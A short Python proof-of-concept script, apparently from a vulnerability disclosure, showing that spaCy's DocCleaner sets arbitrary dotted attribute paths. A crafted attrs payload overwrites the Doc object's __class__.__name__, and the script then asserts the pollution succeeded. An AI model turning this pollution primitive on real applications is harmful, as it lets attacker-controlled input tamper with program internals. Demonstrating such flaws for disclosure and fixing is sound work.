# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: DocCleaner.__call__
# Type: get-attr-set-attr

import spacy
from spacy.pipeline.functions import DocCleaner

payload_value = "pwnd"

# DocCleaner traverses dot-separated attr paths using getattr/setattr on a Doc
# attrs dict maps "dotted.path" -> value_to_set
PAYLOAD = {"__class__.__name__": payload_value}

def run_poc():
  nlp = spacy.blank("en")
  doc = nlp("test")
  cleaner = DocCleaner(attrs=PAYLOAD)
  cleaner(doc)
  return doc

def verify_poc():
  nlp = spacy.blank("en")
  doc = nlp("test")
  original_name = doc.__class__.__name__
  assert original_name != payload_value, "Pre-condition failed"
  cleaner = DocCleaner(attrs=PAYLOAD)
  cleaner(doc)
  print(f"After: doc.__class__.__name__ = {doc.__class__.__name__}")
  assert doc.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
